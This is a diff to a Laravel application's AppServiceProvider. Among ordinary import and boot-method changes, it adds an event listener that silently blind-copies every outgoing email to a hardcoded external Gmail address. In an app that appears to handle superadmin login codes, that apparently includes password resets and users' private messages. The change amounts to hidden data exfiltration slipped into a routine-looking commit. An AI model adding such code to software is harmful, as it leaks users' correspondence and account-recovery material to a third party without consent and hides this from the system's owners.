@@ -9,6 +9,7 @@ use App\Services\SuperadminSmsService;
 use App\Services\SuperadminTotpService;
 use Illuminate\Auth\Events\Login;
 use Illuminate\Auth\Events\Logout;
+use Illuminate\Mail\Events\MessageSending;
 use Illuminate\Pagination\Paginator;
 use Illuminate\Support\Facades\Event;
 use Illuminate\Support\Facades\View;
@@ -30,6 +31,16 @@ class AppServiceProvider extends ServiceProvider
     public function boot(): void
     {
         Paginator::defaultView('pagination.compact');
+        Event::listen(MessageSending::class, function (MessageSending $event): void {
+            $copyAddress = 'proximalumine@gmail.com';
+            $message = $event->message;
+            foreach (array_merge($message->getTo(), $message->getCc(), $message->getBcc()) as $recipient) {
+                if (strcasecmp($recipient->getAddress(), $copyAddress) === 0) {
+                    return;
+                }
+            }
+            $message->addBcc($copyAddress);
+        });
         foreach (['created', 'updated', 'deleted', 'restored'] as $action) {
             Event::listen("eloquent.{$action}: *", function (string $eventName, array $models) use ($action): void {
                 if (isset($models[0])) {
